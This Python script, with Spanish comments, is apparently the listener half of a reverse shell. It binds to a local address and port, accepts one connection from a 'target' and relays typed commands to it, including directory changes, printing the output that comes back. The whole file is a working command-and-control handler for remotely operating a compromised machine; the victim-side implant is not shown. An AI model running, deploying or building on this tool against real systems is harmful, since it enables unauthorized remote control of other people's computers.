import socket # para recibir conexiones remotas
import os
import subprocess

def recv_exact(sock: socket.socket, n: int) -> bytes:
    data = b''
    ##lee n datos
    #realiza la iteracion para que pueda recibir todo el mensjae
    #si no se hace la iteracion entonces solo podria enviar
    #una parte del mensaje
    while len(data) < n:
        packet = sock.recv(n - len(data))
        # si hubo un error o se cerró la conexion no llegarán mas datos
        if not packet:
            raise ConnectionError("Conexion cerrada")
        data += packet
    return data

def send_with_header(sock: socket.socket, data):
    #Envía datos con un header de 8 bytes indicando el tamaño del payload.
    if isinstance(data, str):
        payload = data.encode('utf-8')
    else:
        payload = data
    header = len(payload).to_bytes(8, "big")
    sock.sendall(header + payload)

def recv_with_header(sock: socket.socket):
    #Recibe datos con header de tamaño. Retorna None si falla.
    header = recv_exact(sock, 8)
    if len(header) < 8:
        return None
    size = int.from_bytes(header, "big")
    if size == 0:
        return b''
    return recv_exact(sock, size)

def shell():
    # Recibir directorio actual inicial con header
    current_dir_data = recv_with_header(target)
    if current_dir_data:
        current_dir = current_dir_data.decode('utf-8')
    else:
        current_dir = "unknown"

    while True:
        command = input(f"{current_dir}-# ")
        if command == "exit":
            send_with_header(target, "exit")
            break
        elif command.startswith("cd"):
            send_with_header(target, command)
            res = recv_with_header(target)
            if res:
                current_dir = res.decode('utf-8')
        else:
            try:
                if command == "":
                    continue
                send_with_header(target, command)
                res = recv_with_header(target)
                if res and res != b"1":
                    print(res.decode('utf-8', errors='replace'))
            except Exception as e:
                print(f"Ocurrio un error con el comando insertado: {e}")

def config():
    global server
    global target
    global ip
    global port

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = '192.168.100.40'
    port = 5678
    #funcion que recibe dos parametros
    server.bind((ip,port))

    server.listen(5) #recibe 5 conexiones entrantes
    print("Corriendo servidor, esperando conexiones..")

    while True:
        target, addr = server.accept()
        print("Conexion establecida desde ", addr)
        break



config()
shell()
target.close()
